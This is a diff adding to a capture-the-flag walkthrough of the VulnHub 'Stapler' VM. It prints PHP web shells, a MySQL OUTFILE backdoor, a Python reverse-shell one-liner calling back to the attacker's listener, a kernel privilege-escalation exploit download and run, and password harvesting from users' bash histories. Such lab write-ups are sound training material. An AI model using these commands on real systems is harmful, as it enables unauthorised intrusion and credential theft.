@@ -1033,12 +1033,13 @@ As John's access is elevated we should have access to themes and plugins. Combin
 
 1. Option A: Try to include webshell funtionality in a theme component.
 2. Option B: Try to upload a PhP shell as a wordpress plugin.
+3. Option C: Try to upload a PhP shell via OUTFILE in the mysql
 
-Either option is potentially valid, but I'm going to try modifying a theme page to include php code. Dropping either of these two following two snippets will allow for code execution on the url:
+Any option is potentially valid, but I'm going to try modifying a theme page to include php code. Dropping either of these two following two snippets are a typical go to for code execution on the url:
 
 ``` php
 <?php echo system($_GET["cmd"].' 2>&1'); ?>
-
+// or
 <?php echo shell_exec($_GET['e'].' 2>&1'); ?>
 ```
 I have a through all the themes and can't find a php file I can edit.  
@@ -1065,26 +1066,381 @@ Going to the uploads directory though, I discover the shell upload succeeded:
 https://192.168.56.104:12380/blogblog/wp-content/uploads/
 
 
-> Bonus Shell upgrade - TODO
-Fix the web shell
+Ok so now we attempt to bounce a shell back to the listner we set up:
 
+``` bash
+nc -nvlp 1337
+```
+
+and then we visit: https://192.168.56.105:12380/blogblog/wp-content/uploads/php-reverse-shell.php
+
+And nothing! Just a spining web loading page.
+If we wait long enough we'll see that we have code execution as the following error gets returned:
+
+``` error
+WARNING: Failed to daemonise. This is quite common and not fatal. Connection timed out (110) 
+```
+
+At this stage there are a few possibilities to why this failed, my first thoughts are either the box has firewall egress rules in place or I've made an error in my webshell code edits. 
+
+First lets change our shell to a web shell, this way we can perform som active recon as well as try code execution out on the victim.
+
+Open an editor and I put the following code into system-webshell.php:
+
+``` php
+<?php echo system($_GET["cmd"].' 2>&1'); ?>
+
+```
+
+I upload as before using John's credentials
+
+
+![system-webshell.png](/assets/vulnhub_stuff/stapler/system-webshell.png)
+
+and visit:
+
+https://192.168.56.104:12380/blogblog/wp-content/uploads/system-webshell.php
+
+
+It looks like nothing has happened, but when I call the ls command on the url:
+
+https://192.168.56.104:12380/blogblog/wp-content/uploads/system-webshell.php?cmd=ls
+
+I get:
+
+![web-shell-proof.png](/assets/vulnhub_stuff/stapler/web-shell-proof.png)
+
+Throw a view-source: on to get a better view:
+
+view-source:https://192.168.56.104:12380/blogblog/wp-content/uploads/system-webshell.php?cmd=ls
+
+
+Ok, so we have execution, lets get a shell.
+This time we set it on a port we expect the firewall to allow, 21 (ftp)
+
+``` bash
+# we need sudo because 21 is a reserved port
+sudo nc -nvlp 21
+```
+
+Lets look to see what shells we can use:
+http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+
+I tend to have the most success with the python and perl shells when dealing with Linux, lets try the py one first:
+
+view-source:https://192.168.56.104:12380/blogblog/wp-content/uploads/system-webshell.php?cmd=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.56.1",21));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+We get a connection on our listener: 
+
+```
+listening on [any] 21 ...
+connect to [192.168.56.1] from (UNKNOWN) [192.168.56.105] 58040
+/bin/sh: 0: can't access tty; job control turned off
+$ 
+```
+
+> Bonus backdoor with mysql outfile
+
+while logged into the mysql service you can write a shell to the uploads root with the following:
+``` mysql
+select “<?php echo shell_exec($_GET[‘cmd’]);?>” into outfile ‘/var/www/https/blogblog/wp-content/uploads/mysql-shell.php’;
+```
+
+Execution is as before from the system-webshell.php route. This is riskier as there is no guarantee msql can write to the php executable directories, in this case however it can!
+
+from here lets spawn full bash in our new shell
 
 ``` bash
 python -c 'import pty; pty.spawn("/bin/bash")'
-# background with Ctl^Z
-stty raw -echo
-fg
+
 ```
 
-If I need an ftp server for the transfer:
+gives us
+
+```
+www-data@red:/var/www/https/blogblog/wp-content/uploads$ 
+```
+
+We have a good level of control, but we are still missing the easy use of our bash tty setup.
+
+lets fix that, background the shell with Ctl^Z
+then in your original terminal forward the settings and restart the backround reverse shell with the following commands
 
 ``` bash
-sudo apt-get install python-pyftpdlib
-# anonymous:anonymous@
+stty raw -echo
+fg
+# note you won't see the fg populate
 ```
 
+At this point I have access to the system, lets abuse it.
 
-# Hit Hard!
+## Cronos Master of All Jobs!
+
+TODO - cronjob hijack writeup
+
+## Kernel Busting!
+
+With aging boxes, kernel smashing can be a quick win. This case it's no different, start by getting the full version info
+
+``` bash
+uname -a
+```
+Shows us
+```
+Linux red.initech 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016 i686 i686 i686 GNU/Linux
+```
+
+A little digging with searchsploit and we have a few contenders.
+``` bash
+searchsploit 4.4 linux kernel
+```
+
+```
+---------------------------------------------------------------------------------- ----------------------------------------
+ Exploit Title                                                                    |  Path
+                                                                                  | (/usr/share/exploitdb/)
+---------------------------------------------------------------------------------- ----------------------------------------
+Linux Kernel 2.4.4 < 2.4.37.4 / 2.6.0 < 2.6.30.4 - 'Sendpage' Local Privilege Esc | exploits/linux/local/19933.rb
+Linux Kernel 2.6 < 2.6.19 (White Box 4 / CentOS 4.4/4.5 / Fedora Core 4/5/6 x86)  | exploits/linux_x86/local/9542.c
+Linux Kernel 3.10/3.18 /4.4 - Netfilter IPT_SO_SET_REPLACE Memory Corruption      | exploits/linux/dos/39545.txt
+Linux Kernel 4.4 (Ubuntu 16.04) - 'BPF' Local Privilege Escalation (Metasploit)   | exploits/linux/local/40759.rb
+Linux Kernel 4.4 (Ubuntu 16.04) - 'snd_timer_user_ccallback()' Kernel Pointer Lea | exploits/linux/dos/46529.c
+Linux Kernel 4.4 - 'rtnetlink' Stack Memory Disclosure                            | exploits/linux/local/46006.c
+Linux Kernel 4.4.0 (Ubuntu 14.04/16.04 x86-64) - 'AF_PACKET' Race Condition Privi | exploits/linux_x86-64/local/40871.c
+Linux Kernel 4.4.0 (Ubuntu) - DCCP Double-Free (PoC)                              | exploits/linux/dos/41457.c
+Linux Kernel 4.4.0 (Ubuntu) - DCCP Double-Free Privilege Escalation               | exploits/linux/local/41458.c
+Linux Kernel 4.4.0-21 (Ubuntu 16.04 x64) - Netfilter target_offset Out-of-Bounds  | exploits/linux_x86-64/local/40049.c
+Linux Kernel 4.4.1 - REFCOUNT Overflow Use-After-Free in Keyrings Local Privilege | exploits/linux/local/39277.c
+Linux Kernel 4.4.1 - REFCOUNT Overflow Use-After-Free in Keyrings Local Privilege | exploits/linux/local/40003.c
+Linux Kernel 4.4.x (Ubuntu 16.04) - 'double-fdput()' bpf(BPF_PROG_LOAD) Privilege | exploits/linux/local/39772.txt
+Linux Kernel < 3.4.5 (Android 4.2.2/4.4 ARM) - Local Privilege Escalation         | exploits/arm/local/31574.c
+Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation            | exploits/linux/local/44298.c
+Linux Kernel < 4.4.0-21 (Ubuntu 16.04 x64) - 'netfilter target_offset' Local Priv | exploits/linux/local/44300.c
+Linux Kernel < 4.4.0-83 / < 4.8.0-58 (Ubuntu 14.04/16.04) - Local Privilege Escal | exploits/linux/local/43418.c
+---------------------------------------------------------------------------------- ----------------------------------------
+Shellcodes: No Result
+Papers: No Result
+```
+closer look at Linux Kernel < 4.4.0-83 / < 4.8.0-58 (Ubuntu 14.04/16.04) - Local Privilege Escal
+``` bash
+searchsploit -x 43418.c
+```
+
+This almost looks promising as it includes KASLR and SMEP bypasses, but no SMAP bypass.
+
+Kernel Address Space Layout Randomization (KASLR) randomizes where the kernel code is placed at boot time, making it near impossible to overflow memory with hard coded memory locations. Covering this in the exploit shows the devleoper has a matured the exploit to work outside a PoC Lab.
+
+
+Supervisor Mode Access Prevention (SMAP) is designed to complement Supervisor Mode Execution Prevention (SMEP), SMEP can be used to prevent supervisor mode from unintentionally executing user-space code, SMAP extends this protection to reads and writes.
+
+Bit risky, lets look elsewhere: Linux Kernel 4.4.x (Ubuntu 16.04) - 'double-fdput()' bpf(BPF_PROG_LOAD) Privilege
+
+``` bash
+searchsploit -x 39772
+```
+
+first pre-req is that CONFIG_BPF_SYSCALL is set to true.
+Quick google shows this should be located here: /boot/config-4*
+
+lets check:
+
+``` bash
+cat /boot/config-4.4.0-21-generic | grep CONFIG_BPF_SYSCALL
+```
+
+yaas!
+
+```
+CONFIG_BPF_SYSCALL=y
+```
+
+Next we need to check sysctl to make sure kernel.unprivileged_bpf_disabled is 0
+
+``` bash
+sysctl -a | grep kernel.unprivileged_bpf_disabled
+```
+
+It is!
+
+```
+sysctl: permission denied on key 'fs.protected_hardlinks'
+sysctl: permission denied on key 'fs.protected_symlinks'
+sysctl: permission denied on key 'kernel.cad_pid'
+kernel.unprivileged_bpf_disabled = 0
+sysctl: permission denied on key 'kernel.unprivileged_userns_apparmor_policy'
+sysctl: permission denied on key 'kernel.usermodehelper.bset'
+sysctl: permission denied on key 'kernel.usermodehelper.inheritable'
+sysctl: permission denied on key 'net.ipv4.tcp_fastopen_key'
+sysctl: permission denied on key 'net.ipv6.conf.all.stable_secret'
+sysctl: permission denied on key 'net.ipv6.conf.default.stable_secret'
+sysctl: permission denied on key 'net.ipv6.conf.enp0s3.stable_secret'
+sysctl: permission denied on key 'net.ipv6.conf.lo.stable_secret'
+```
+
+This looks a little more solid and has an off system link to PoC code, lets get it
+
+``` bash
+https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip
+sudo python -m SimpleHTTPServer 80
+```
+
+on our victim, lets pull the exploit over with wget
+
+TODO
+
+this! With outputs
+```
+wget http://192.168.56.1/39772.zip 
+unzip 39772.zip
+cd 39772
+tar -xvf exploit.tar
+cd ebpf_mapfd_doubleput_exploit
+bash compile.sh
+./doubleput
+# I AM ROOT!
+
+```
+
+after the transfer, 
+
+## Poor Peter!
+A little trick I learned from Hack the box is always check to see if you can read the user histories before you do anything. A handy password parsed into a command might just give us a quick way to a user account.
+
+``` bash
+cat /home/*/.bash_history > history.txt
+```
+executes fine with one deny
+
+```
+cat: /home/peter/.bash_history: Permission denied
+```
+
+peter must be the admin, as he's the only protected account, lets see if there are any goodies:
+
+![history.png](/assets/vulnhub_stuff/stapler/history.png)
+
+
+peter's ssh login password! JZQuyIN5
+
+lets be peter 
+
+``` bash
+su peter
+JZQuyIN5
+```
+
+Success!
+
+```
+This is the Z Shell configuration function for new users,
+zsh-newuser-install.
+You are seeing this message because you have no zsh startup files
+(the files .zshenv, .zprofile, .zshrc, .zlogin in the directory
+~).  This function can help you with a few settings that should
+make your use of the shell easier.
+
+You can:
+
+(q)  Quit and do nothing.  The function will be run again next time.
+
+(0)  Exit, creating the file ~/.zshrc containing just a comment.
+     That will prevent this function being run again.
+
+(1)  Continue to the main menu.
+
+(2)  Populate your ~/.zshrc with the configuration recommended
+     by the system administrator and exit (you will need to edit
+     the file by hand, if so desired).
+
+--- Type one of the keys in parentheses --- 
+```
+
+My zsh is not so good, I select 0 to drop to a vanilla shell.
+
+pop a bash prompt:
+```bash
+bash
+```
+lets check if the hunch is right and we have admin:
+``` bash
+sudo -l
+```
+prompts us for peter's password
+```
+We trust you have received the usual lecture from the local System
+Administrator. It usually boils down to these three things:
+
+    #1) Respect the privacy of others.
+    #2) Think before you type.
+    #3) With great power comes great responsibility.
+
+[sudo] password for peter: 
+```
+Enter it to find out we have full sudo!
+
+```
+Matching Defaults entries for peter on red:
+    lecture=always, env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User peter may run the following commands on red:
+    (ALL : ALL) ALL
+```
+
+lets get the flag!
+
+```
+sudo ls -la /root
+```
+
+```
+total 208
+drwx------  4 root root  4096 Aug 25 21:59 .
+drwxr-xr-x 22 root root  4096 Jun  7  2016 ..
+-rw-------  1 root root     1 Jun  5  2016 .bash_history
+-rw-r--r--  1 root root  3106 Oct 22  2015 .bashrc
+-rwxr-xr-x  1 root root  1090 Jun  5  2016 fix-wordpress.sh
+-rw-r--r--  1 root root   463 Jun  5  2016 flag.txt
+-rw-r--r--  1 root root   345 Jun  5  2016 issue
+-rw-r--r--  1 root root    50 Jun  3  2016 .my.cnf
+-rw-------  1 root root     1 Jun  5  2016 .mysql_history
+drwxr-xr-x 11 root root  4096 Jun  3  2016 .oh-my-zsh
+-rw-r--r--  1 root root   148 Aug 17  2015 .profile
+-rwxr-xr-x  1 root root   103 Jun  5  2016 python.sh
+-rw-------  1 root root  1024 Jun  5  2016 .rnd
+drwxr-xr-x  2 root root  4096 Jun  4  2016 .vim
+-rw-------  1 root root     1 Jun  5  2016 .viminfo
+-rw-r--r--  1 root root 54405 Jun  5  2016 wordpress.sql
+-rw-r--r--  1 root root 39206 Jun  3  2016 .zcompdump
+-rw-r--r--  1 root root 39352 Jun  3  2016 .zcompdump-red-5.1.1
+-rw-------  1 root root    39 Jun  5  2016 .zsh_history
+-rw-r--r--  1 root root  2839 Jun  3  2016 .zshrc
+-rw-r--r--  1 root root    17 Jun  3  2016 .zsh-update
+```
+get the flag
+``` bash
+sudo cat /root/flag.txt
+```
+
+W00tW00t!
+
+```
+~~~~~~~~~~<(Congratulations)>~~~~~~~~~~
+                          .-'''''-.
+                          |'-----'|
+                          |-.....-|
+                          |       |
+                          |       |
+         _,._             |       |
+    __.o`   o`"-.         |       |
+ .-O o `"-.o   O )_,._    |       |
+( o   O  o )--.-"`O   o"-.`'-----'`
+ '--------'  (   o  O    o)  
+              `----------`
+b6b545dc11b7a270f4bad23432190c75162c4a2b
+```
+
+Ok so that was the easy way.
 
 
 
